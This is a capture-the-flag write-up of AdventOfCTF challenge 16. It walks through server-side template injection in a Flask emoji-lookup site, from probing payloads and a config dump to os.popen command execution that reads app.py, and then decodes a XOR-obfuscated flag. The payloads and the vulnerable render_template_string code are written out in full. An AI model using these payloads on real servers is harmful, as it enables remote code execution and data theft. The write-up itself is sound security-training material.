+++
author = "Maik de Kruif"
title = "Challenge 16 - AdventOfCTF"
date = 2021-01-01T01:44:45+01:00
description = "A writeup for challenge 16 of AdventOfCTF."
cover = "img/adventofctf/246397ca184f8b03ac8fecf50ee1051e.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "python",
    "flask",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 1600

## Description

Santa has launched a new product, the Emoji finder! This is the first version, can you find your favorite emoji?

Visit <https://16.adventofctf.com> to start the challenge.

## Recon

Upon opening the challenge website we're greeted with some text and an input field. The text says the following: "Santa likes emojis! Enter one to find out what it means. Try 'santa' for instance.". If we then enter 'santa' in the input field and press the search button, we get a santa emoji: 🎅.

When opening the source of the page we also find the following comment: "Here is a cheatsheet of the emojis you can use: <https://www.webfx.com/tools/emoji-cheat-sheet/>" and some javascript:

```js
function send() {
  let emoji = $("#emoji")[0].value;
  if (emoji.length > 0) {
    $.post("/", { emoji: emoji }, function (data) {
      $("#msg")[0].innerHTML = "<b>" + data + "</b>";
    });
  }
}
```

_Note: when I was writing this write-up, I noticed that the subtitle hints at the `os` module as the letters "os" are marked yellow in "d**os**e"._

## Finding the vulnerability

After trying several things, [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection) (SSTI) came to mind.

SSTI occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

An easy way to check for SSTI is by using the following graph from PortSwigger:

{{< figure src="/img/adventofctf/ssti_graph.png" title="SSTI Graph (by PortSwigger)" >}}

So I followed this graph and got the following results:

`emoji=${7*7}` -> `You entered an unknown emoji: ${7*7}`  
`emoji={{7*7}}` -> `You entered an unknown emoji: 49`  
`emoji={{7*'7'}}` -> `You entered an unknown emoji: 7777777`

This means the server is most likely using either Jinja2 of Twig.

## Exploit

Now that we found the vulnerability, we can start exploiting it. Let's start by getting the config. We can try to get it by entering `{{config}}` or `{{config.items()}}` as the emoji.

{{< code language="python" title="Result" >}}

```python
dict_items([
  ('ENV', 'production'),
  ('DEBUG', True),
  ('TESTING', True),
  ('PROPAGATE_EXCEPTIONS', None),
  ('PRESERVE_CONTEXT_ON_EXCEPTION', None),
  ('SECRET_KEY', Undefined),
  ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)),
  ('USE_X_SENDFILE', False),
  ('SERVER_NAME', None),
  ('APPLICATION_ROOT', '/'),
  ('SESSION_COOKIE_NAME', 'session'),
  ('SESSION_COOKIE_DOMAIN', False),
  ('SESSION_COOKIE_PATH', None),
  ('SESSION_COOKIE_HTTPONLY', True),
  ('SESSION_COOKIE_SECURE', False),
  ('SESSION_COOKIE_SAMESITE', None),
  ('SESSION_REFRESH_EACH_REQUEST', True),
  ('MAX_CONTENT_LENGTH', None),
  ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)),
  ('TRAP_BAD_REQUEST_ERRORS', None),
  ('TRAP_HTTP_EXCEPTIONS', False),
  ('EXPLAIN_TEMPLATE_LOADING', True),
  ('PREFERRED_URL_SCHEME', 'http'),
  ('JSON_AS_ASCII', False),
  ('JSON_SORT_KEYS', True),
  ('JSONIFY_PRETTYPRINT_REGULAR', True),
  ('JSONIFY_MIMETYPE', 'application/json'),
  ('TEMPLATES_AUTO_RELOAD', None),
  ('MAX_COOKIE_SIZE', 4093),
  ('flag', 'HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*'),
  ('CLD_CONTINUED', 6),
  ('CLD_DUMPED', 3),
  ('CLD_EXITED', 1),
  ('CLD_TRAPPED', 4),
  ('EX_CANTCREAT', 73),
  ('EX_CONFIG', 78),
  ('EX_DATAERR', 65),
  ('EX_IOERR', 74),
  ('EX_NOHOST', 68),
  ('EX_NOINPUT', 66),
  ('EX_NOPERM', 77),
  ('EX_NOUSER', 67),
  ('EX_OK', 0),
  ('EX_OSERR', 71),
  ('EX_OSFILE', 72),
  ('EX_PROTOCOL', 76),
  ('EX_SOFTWARE', 70),
  ('EX_TEMPFAIL', 75),
  ('EX_UNAVAILABLE', 69),
  ('EX_USAGE', 64),
  ('F_LOCK', 1),
  ('F_OK', 0),
  ('F_TEST', 3),
  ('F_TLOCK', 2),
  ('F_ULOCK', 0),
  ('GRND_NONBLOCK', 1),
  ('GRND_RANDOM', 2),
  ('NGROUPS_MAX', 32),
  ('O_ACCMODE', 2097155),
  ('O_APPEND', 1024),
  ('O_ASYNC', 8192),
  ('O_CLOEXEC', 524288),
  ('O_CREAT', 64),
  ('O_DIRECT', 16384),
  ('O_DIRECTORY', 65536),
  ('O_DSYNC', 4096),
  ('O_EXCL', 128),
  ('O_EXEC', 2097152),
  ('O_LARGEFILE', 0),
  ('O_NDELAY', 2048),
  ('O_NOATIME', 262144),
  ('O_NOCTTY', 256),
  ('O_NOFOLLOW', 131072),
  ('O_NONBLOCK', 2048),
  ('O_PATH', 2097152),
  ('O_RDONLY', 0),
  ('O_RDWR', 2),
  ('O_RSYNC', 1052672),
  ('O_SEARCH', 2097152),
  ('O_SYNC', 1052672),
  ('O_TMPFILE', 4259840),
  ('O_TRUNC', 512),
  ('O_TTY_INIT', 0),
  ('O_WRONLY', 1),
  ('POSIX_FADV_DONTNEED', 4),
  ('POSIX_FADV_NOREUSE', 5),
  ('POSIX_FADV_NORMAL', 0),
  ('POSIX_FADV_RANDOM', 1),
  ('POSIX_FADV_SEQUENTIAL', 2),
  ('POSIX_FADV_WILLNEED', 3),
  ('PRIO_PGRP', 1),
  ('PRIO_PROCESS', 0),
  ('PRIO_USER', 2),
  ('P_ALL', 0),
  ('P_NOWAIT', 1),
  ('P_NOWAITO', 1),
  ('P_PGID', 2),
  ('P_PID', 1),
  ('P_WAIT', 0),
  ('RTLD_GLOBAL', 256),
  ('RTLD_LAZY', 1),
  ('RTLD_LOCAL', 0),
  ('RTLD_NODELETE', 4096),
  ('RTLD_NOLOAD', 4),
  ('RTLD_NOW', 2),
  ('R_OK', 4),
  ('SCHED_BATCH', 3),
  ('SCHED_FIFO', 1),
  ('SCHED_IDLE', 5),
  ('SCHED_OTHER', 0),
  ('SCHED_RESET_ON_FORK', 1073741824),
  ('SCHED_RR', 2),
  ('SEEK_CUR', 1),
  ('SEEK_END', 2),
  ('SEEK_SET', 0),
  ('ST_APPEND', 256),
  ('ST_MANDLOCK', 64),
  ('ST_NOATIME', 1024),
  ('ST_NODEV', 4),
  ('ST_NODIRATIME', 2048),
  ('ST_NOEXEC', 8),
  ('ST_NOSUID', 2),
  ('ST_RDONLY', 1),
  ('ST_RELATIME', 4096),
  ('ST_SYNCHRONOUS', 16),
  ('ST_WRITE', 128),
  ('TMP_MAX', 10000),
  ('WCONTINUED', 8),
  ('WCOREDUMP', <built-in function WCOREDUMP>),
  ('WEXITED', 4),
  ('WEXITSTATUS', <built-in function WEXITSTATUS>),
  ('WIFCONTINUED', <built-in function WIFCONTINUED>),
  ('WIFEXITED', <built-in function WIFEXITED>),
  ('WIFSIGNALED', <built-in function WIFSIGNALED>),
  ('WIFSTOPPED', <built-in function WIFSTOPPED>),
  ('WNOHANG', 1),
  ('WNOWAIT', 16777216),
  ('WSTOPPED', 2),
  ('WSTOPSIG', <built-in function WSTOPSIG>),
  ('WTERMSIG', <built-in function WTERMSIG>),
  ('WUNTRACED', 2),
  ('W_OK', 2),
  ('X_OK', 1)
])
```

{{< /code >}}

If we take a look at it we find an item called 'flag' but it looks like it is encrypted in some way:

```python
('flag', 'HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*')
```

## Decrypting the flag

Decrypting the flag was easier said then done. I tried several algorithms but none resulted in any usefull output and it doesn't look like the output of any common encryption algorithm.

This is when I started to try to get the source of the server so we can see how it gets and/or creates the flag. To get the source we first need arbitrary code execution.

### Arbitrary Code Execution (ACE)

The easiest way to get ACE is using the `os` module in python. To use it, the server has to have it imported though.

We can find the `os` module in the `globals` dictionary, which, in turn, can be found in the `__init__` function of the `Config` class. To get to it we can use the following path:

```python
config.__class__.__init__.__globals__["os"]
```

If we enter this as the input but within brackets, we get the following output:

```text
<module 'os' from '/usr/local/lib/python3.7/os.py'>
```

_Note: if the `os` module wouldn't have been there, you could look for another module in `{{config.__class__.__init__.__globals__}}`_

This means our exploit works and we can use it to execute commands. To do this, we can use the `popen` function like so:

```python
config.__class__.__init__.__globals__['os'].popen('ls').read()
```

### Grabbing the file

If we use the above code as the input, we get the following return message:

```text
You entered an unknown emoji: __pycache__
app.py
requirements.txt
serve.sh
static
supervisord.pid
templates
```

The source of the server is probably `app.py` as it's the default for flask applications. Let's `cat` it:

```python
config.__class__.__init__.__globals__['os'].popen('cat app.py').read()
```

{{< code language="python" title="app.py" >}}

```python
import random
from flask import Flask, render_template_string, render_template, request
import os
import emojis

app = Flask(__name__)
app.config['SECRET_KEY'] = 'Leer alles over Software Security bij Arjen (follow @credmp) at https://www.novi.nl'

def magic(flag, key):
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))

file = open("/tmp/flag.txt", "r")
flag = file.read()

app.config['flag'] = magic(flag, '112f3a99b283a4e1788dedd8e0e5d35375c33747')
flag = ""

os.remove("/tmp/flag.txt")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        emoji="unknown"
        try:
            p = request.values.get('emoji')
            if p != None:
                emoji = emojis.db.get_emoji_by_alias(p)
        except Exception as e:
            print(e)
            pass

        try:
            if emoji == None:
                return render_template_string("You entered an unknown emoji: %s" % p)
            else:
                return render_template_string("You entered %s which is %s. It's aliases %s" % (p, emoji.emoji, emoji.aliases))
        except Exception as e:
            print(e)
            return 'Exception'

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

```

{{< /code >}}

When looking at the file, we see that the flag variable is set to the output of the `magic` function:

```python
app.config['flag'] = magic(flag, '112f3a99b283a4e1788dedd8e0e5d35375c33747')
```

```python
def magic(flag, key):
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))
```

The `magic` function takes a flag and key as the input and returns an encrypted string for the output. When anaylizing this function, we see it does some bitwise XOR operations and because we have the key we've got two known values and can, thus, calculate the third.

We can do this by just passing our encrypted flag along with to key to the `magic` function.

```text
Python 3.6.9 (default, Nov  7 2019, 10:44:02)
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> def magic(flag, key):
...     return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))
...
>>> magic("HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*", "112f3a99b283a4e1788dedd8e0e5d35375c33747")
'NOVI{you_used_the_m@gic_of_christmas}\n'
>>>
```

## Solution

We got the flag! It is `NOVI{you_used_the_m@gic_of_christmas}`.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#16-17).
